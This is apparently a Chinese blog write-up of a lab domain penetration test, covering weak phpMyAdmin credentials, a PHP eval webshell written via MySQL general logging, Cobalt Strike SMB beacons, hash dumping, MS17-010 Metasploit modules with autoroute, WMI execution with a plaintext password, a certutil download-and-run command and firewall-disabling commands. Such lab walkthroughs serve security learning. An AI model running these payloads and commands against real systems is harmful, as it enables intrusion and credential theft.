+        <p><strong>本文首发于先知社区：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9607">https://xz.aliyun.com/t/9607</a></strong></p>
+<p>之前在打一个域环境的时候出现了域内主机不出网的情况，当时用的是cs的socks代理将不出网主机的流量代理到了边缘主机上。当时没有考虑太多，下来之后想到搭一个环境复现一下当时的情况，看有没有更简便的方法能够打下不出网的主机。</p>
+<p>机缘巧合之下，发现了这个域环境还不错，再复现的过程中也有一些知识触及了我的知识盲区，也收获了许多新的知识。特地把过程记录下来，与想要学习打域内不出网主机的师傅们共同分享。</p>
+<span id="more"></span>
+
+<h1 id="靶场地址分配"><a href="#靶场地址分配" class="headerlink" title="靶场地址分配"></a>靶场地址分配</h1><p>内网网段：192.168.52.0/24</p>
+<p>外网网段：192.168.10.0/24</p>
+<p>攻击机：</p>
+<p>kali：192.168.10.11</p>
+<p>靶场：</p>
+<p>win7(内)：192.168.52.143</p>
+<p>win7(外)：192.168.10.15</p>
+<p>域内主机：</p>
+<p>Winserver2003：192.168.52.141</p>
+<p>Winserver2008：192.168.52.138</p>
+<p>其中win7可以外网、内网通信，域内主机只能内网之间进行通信</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/f17be4de19b9fa719433c19cb52a5a12.png"><br><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/0d2189a3256020e2a81fb289bd191dff.png"><br><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/fda8b4b8aa584195ef706c94eaa14376.png"></p>
+<p>一开始DCping不通win7，win7关闭防火墙之后可以ping通</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/050e0873eaa32a73e648afe08cb94fe7.png"></p>
+<p>打开C盘下的phpstudy目录打开web服务</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/ea1e93134bc57be9b4b7116bd51d1601.png"></p>
+<h1 id="web服务器渗透"><a href="#web服务器渗透" class="headerlink" title="web服务器渗透"></a>web服务器渗透</h1><h2 id="nmap探测端口"><a href="#nmap探测端口" class="headerlink" title="nmap探测端口"></a>nmap探测端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -P0 -sV -O 192.168.10.15</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/b9b481a9f82c2c6f1f1b88c7bd9bc940.png"></p>
+<p>开了80端口，尝试访问web地址，发现为php探针</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/78edc9b49984352e76d5718a21948a69.png"></p>
+<p>滑到最底部，发现网站底部有一个MySQL数据库连接检测</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/08fceb9032b60c6b0424692956db4d1d.png"></p>
+<p>弱口令root/root连接成功</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/848143be6cd6d0f85c1d4fa7824df9a5.png"></p>
+<h2 id="扫描后台"><a href="#扫描后台" class="headerlink" title="扫描后台"></a>扫描后台</h2><p>我这里用的是御剑，但是好像很拉，因为在我打完这个靶场之后再去网上看的时候发现他们很多扫出来一个cms，通过cms也能拿shell，这里我就不演示怎么用cms弱口令进后台写shell了，如果有感兴趣的小伙伴可以自行搜索一下</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/29e759a86eba3eb4e5fd0dcb97d390c4.png"></p>
+<p>发现phpmyadmin目录，还是root/root弱口令登陆成功</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/bf7f769d6cf6b45847ebd4898e56a40f.png"></p>
+<p>进入后界面如下所示</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/2f8df1d915ed636ad9ee88964fa62ba7.png"></p>
+<h2 id="通过phpmyadmin写shell"><a href="#通过phpmyadmin写shell" class="headerlink" title="通过phpmyadmin写shell"></a>通过phpmyadmin写shell</h2><p>通过phpmyadmin写shell有两种方式</p>
+<p>首先我尝试 <code>select into outfile</code> 直接写入，但是他这里<code>secure_file_priv</code>的值为NULL，所以无法提权</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/ce75b493d073b2f5e6343d391f86ff7e.png"></p>
+<p>只能使用另外一种方法，用全局日志写shell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%general%&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>查看配置，可以看到全局日志是处于关闭的状态，<code>gengeral_log_file</code>返回了日志的绝对地址</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/998bf4b14987695087cbf7bd8d862dae.png"></p>
+<p>那这里我先把它的全局日志打开，再往它路径里面写入一个一句话木马</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/55134922bb3dd7ed9aa0140d328296d4.png"></p>
+<p>开启全局日志后修改绝对路径，注意这里有一个坑，日志给我们返回的路径是<code>C:\\phpStudy\\MySQL\\data\\stu1.log</code>，但是mysql访问的绝对地址为<code>C:\\phpStudy\\WWW</code>目录下的文件，所以这个地方写shell必须要写到WWW目录下才能够用蚁剑连接上</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/06a53e1cbff3d9034fa2a40ebd025848.png"></p>
+<p>这里再写入一句话木马</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/4b2497c8ad7c730eff4e6a38664d157e.png"></p>
+<p>然后再上蚁剑连接即可</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/1819fa0ba9110af7c8880853c8b7e7cf.png"></p>
+<p>可以看到连接成功</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/d98c77221bb750a3fefd80397e55fe21.png"></p>
+<h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><p>查看下系统的权限，一上来就是administrator权限就很舒服</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3c6a0234f3cbc4ceb43cc25b80c4bb42.png"></p>
+<p>ipconfig /all查看网络信息，域环境+双网卡</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/34d2ed6c98ca726abe226690b730a1e4.png"></p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/965ce35b9a81025a47c91c9fbd879137.png"></p>
+<p>tasklist /svc粗略看了一下，似乎是没有杀软的</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/9040f0d28dc26accaf55a26fadfc3319.png"></p>
+<p>想着没有杀软，那么直接用最简单粗暴的上cs更省心，上传一个cs生成的木马exe到目标主机上</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8f5cac2cd879b433b88e9c031f218076.png"></p>
+<p>用计划任务上线cs</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3b9999546a7c8c0d9430323c9a6cc6c9.png"></p>
+<p>成功上线</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/2051070b0a189819c79a4bea8d7eed66.png"></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>net view查看域信息</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/533da861b46328357a8eff80abbe4d56.png"></p>
+<p>使用cs自带的端口扫描扫一波主机</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/57185cf29565d4e3db9a81713fc1d3e3.png"></p>
+<p>扫出来所有的主机如下</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8f389225e67702e65f47098b2b200bcd.png"></p>
+<p>hashdump抓一波hash</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/a82a054771b8b76dec1d49a7c032903c.png"></p>
+<p>logonpasswords抓一波明文</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8f1f0472e1fd9b3249d1df5ce289a5e0.png"></p>
+<p>所有凭证如下，打码的原因是因为之前登陆的时候密码要重置，弄了一个带有个人信息的密码</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/c61e8926c8d5dab6d75eddebaf44b665.png"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这里我测试了一下，因为目标主机没有开启防火墙，是能够通过cs自带的psexec一波横向抓域控和域内机器密码的，但是鉴于这个win7双网卡且域内另外主机不出网的情况，练习一下如何打不出网的主机</p>
+<p>不出网机器上线一般有以下几种方式：</p>
+<ul>
+<li><p>  使用smb beacon</p>
+</li>
+<li><p>  配置listener通过HTTP代理上线</p>
+</li>
+<li><p>  使用pystinger搭建socks4代理</p>
+</li>
+</ul>
+<p>这里我使用SMB beacon这个方法</p>
+<p><strong>SMB</strong><br>Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB<br>beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless<br>Payload 上线</p>
+<p>首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb<br>beacon使目标主机上线</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/4e7ab40bd84f6ca1cf6e30703a5164f9.png"></p>
+<p>1.使用条件</p>
+<ul>
+<li><p>  具有 SMB Beacon 的主机必须接受 445 端口上的连接。</p>
+</li>
+<li><p>  只能链接由同一个 Cobalt Strike 实例管理的 Beacon。</p>
+</li>
+<li><p>  利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</p>
+</li>
+</ul>
+<p>2.使用方法</p>
+<p>(1)建立smb listener</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/0bdb70b932b4c4f1f3a34490d8e8b1dd.png"></p>
+<p>(2)在cs中使用psexec进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator<br>，即拥有目标主机管理员权限</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/04c2979abf7d708ec3a90297c9e230cd.png"></p>
+<p>(3)连接成功，可以看到smb beacon上线的主机右侧有∞∞标识</p>
+<p>使用这种方法上线的机器，主要是通过出网机作为一个中间人，不出网主机成功上线后，如果出网机一断开，这个不出网主机也会断</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/e493469a9757b742a1e900741be69cdc.png"></p>
+<h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>用Ladon扫一波内网的永恒之蓝，发现这几台主机都存在MS17-010</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/01cfa57adcc4b46d314748bd96cc0d91.png"></p>
+<p>ms17010常见的几种打法：</p>
+<ul>
+<li><p>  msf</p>
+</li>
+<li><p>  ladon/ladon_ms17010</p>
+</li>
+<li><p>  从msf分离出的exe</p>
+</li>
+<li><p>  nessus里的exe</p>
+</li>
+<li><p>  cs插件</p>
+</li>
+</ul>
+<p>这几种打法，我在这个环境中都做过尝试。过程就不一一叙述了，直接说我测试的结果</p>
+<p>msf是最稳定的，但是打起来有稍许的麻烦因为要设置监听模块和选择攻击模块等配置。ladon_ms17010方便但是不太稳有时候会打不成功。cs插件也不稳，并且在这种不出网网络不稳定的情况下成功率会变的更低</p>
+<p>在这种不出网的情况下，可以优先考虑使用从msf分离出的exe和ladon_ms17010来打，打成功会直接通过自定义的dll新建一个用户并加入管理员组，开启3389端口，而且还会留一个粘滞键后门</p>
+<p>根据实际情况，可考虑在合适的时间段和条件下直接远程登入，翻一下敏感数据，往往会因为运维人员的很多“好习惯”而给渗透带来很多便利，比如说“密码本.txt”</p>
+<h2 id="cs派生msf会话"><a href="#cs派生msf会话" class="headerlink" title="cs派生msf会话"></a>cs派生msf会话</h2><p>msf设置监听端口</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8ffdeb7821bf0dc7d7f20e2cf6ce155f.png"></p>
+<p>cs新建端口建立对话</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/4e6aaebb778bf469c7cda9d2a75f4573.png"></p>
+<p>运行拿到meterpreter</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/e70147039d0e21e53ceb0263eca9310c.png"></p>
+<h2 id="ms-17-010获取域控权限"><a href="#ms-17-010获取域控权限" class="headerlink" title="ms_17_010获取域控权限"></a>ms_17_010获取域控权限</h2><p>这里因为知道了DC是有ms_17_010这个漏洞的，所以我先尝试了用永恒之蓝打一波</p>
+<p>使用如下模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/b745ff17f3cef57d7b6675846dc0c9b9.png"></p>
+<p>运行之后发现exp已经打过去了但是没有session建立</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8172a2b118e6070fac274eea8020e3c1.png"></p>
+<p>再换个ms17010的模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/blind_tcp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/1d56ae45710cf87894d6e63aa7600153.png"></p>
+<p>同样没有拿到shell，当时没有细想，后来我考虑到可能是win7处于两个网段的原因，所以用永恒之蓝直接打是拿不到shell的</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/7cd34a91bdd9527bdb4e4d7739af66cd.png"></p>
+<h2 id="msf打不出网机器的ms-17-010"><a href="#msf打不出网机器的ms-17-010" class="headerlink" title="msf打不出网机器的ms_17_010"></a>msf打不出网机器的ms_17_010</h2><p>想到之前拿到了win7的meterpreter，所以用添加路由的方式尝试一下</p>
+<p>msf在单兵作战的时候还是很稳定很香的。win7在msf上线后，因为我们已经提前知道了，存在52这个不出网的段，那么就需要在msf中添加路由</p>
+<p>1.查看路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3ffc5c89e8424cd2404885223fb90bef.png"></p>
+<p>2.添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/6806bdafdc0ee3187c28a2e2088ba908.png"></p>
+<p>3.查看添加的路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/169053dd7f7232c60511d29f299d2a6d.png"></p>
+<p>4.开始攻击</p>
+<p>把shell切换到后台，再运用ms17_010_eternalblue模块</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/b84bcae5626da1bda9761e84f1019c9a.png"></p>
+<p>这次能够成功建立连接</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/d153d5565524a78ce0478f24271398e3.png"></p>
+<h2 id="ms-17-010模块总结"><a href="#ms-17-010模块总结" class="headerlink" title="ms_17_010模块总结"></a>ms_17_010模块总结</h2><p>漏洞检测方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>
+<p>之后设置一下目标ip和线程即可，这里因为已经扫出存在漏洞的机器了，所以就没有进行漏洞检测。</p>
+<p>漏洞利用常使用的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
+<p>这里的第一个和第三个模块需要目标开启命名管道，并且比较稳定。第二个模块只要存在漏洞即可，但是会有概率把目标打蓝屏，而且杀软拦截也会比较严格，如果有杀软就基本可以放弃这个模块了。</p>
+<p>在打ms17010的时候，不妨使用auxiliary/admin/smb/ms17_010_command模块探测一下是否可以使用命名管道。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.164.156 192.168.164.161</span><br><span class="line"></span><br><span class="line">set command tasklist</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>如果命令执行成功的话就可以优先考虑这两个模块进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
+<h2 id="WMI获取域控服务器"><a href="#WMI获取域控服务器" class="headerlink" title="WMI获取域控服务器"></a>WMI获取域控服务器</h2><p>因为之前用了两个ms_17_010的模块都没有打成功，而session放在后台是后面才想到的打法，在当时模块没有打成功的情况下我决定另辟蹊径</p>
+<p>首先我打开3389端口并关闭防火墙进到win7的远程桌面</p>
+<p>注册表开启3389端口</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br></pre></td></tr></table></figure>
+<p>关闭防火墙</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="built_in">set</span> opmode disable <span class="comment">#windows server 2003 之前</span></span><br><span class="line"></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment">#windows server 2003 之后</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/d61149218a4763bb4585f67ab83b036d.png"></p>
+<p>这个时候防火墙是开启，关闭防火墙，使用域用户god\administrator/hongrisec@2020成功登录这一台win7WEB主机</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3d25039447220e696f47fc6dd0d0139b.png"></p>
+<p>上传vmiexec.vbs到192.168.52.143（win7）机器上，然后执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe vmiexec.vbs /cmd <span class="number">192.168</span>.<span class="number">52.138</span> administrator hongrisec@<span class="number">2020</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+<p>因为我用vbs几次都没有回显，所以我这里使用的Ladon.exe，执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon.exe wmiexec <span class="number">192.168</span>.<span class="number">52.138</span> administrator hongrisec@<span class="number">2020</span> whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/e57e7ab24e82eeb1b218469e2b92c3cd.png"></p>
+<p>同上面的过程一样，获取一个正向的msf连接，过程如下：</p>
+<p>首先生成一个正向的exe文件放到win7的网站目录上</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/7192a2f3422701078eb37365d618f808.png"></p>
+<p>在win7上看一下，上传成功</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/f636367b3dbf47f5e4e5ae4465fa668b.png"></p>
+<p>在win7上使用WMI执行命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">52.143</span>/<span class="number">6666</span>.exe&amp;<span class="number">6666</span>.exe</span><br></pre></td></tr></table></figure>
+<p>成功执行，这时候在138机器（即DC-win2008）上开启6666端口监听</p>
+<p>在msf上个运行blin_tcp来获取回话</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/fa148c938f9597b17ca0482f2138c512.png"></p>
+<p>成功获取域控权限，后续提权</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/00551d435277c5686e5806c45ce828ca.png"></p>
+<p>使用CVE-2018-8120提权，成功提到系统权限，这里我思考了一下用MS14-068应该也能够提权成功</p>
+<p><img src="/images/%E5%B7%A7%E7%94%A8smb%E6%8B%BF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/6c5b9923c07a2d578523c3da9c23c232.png"></p>
+<p>成功提权，上免杀mimikatz，成功抓到hash</p>
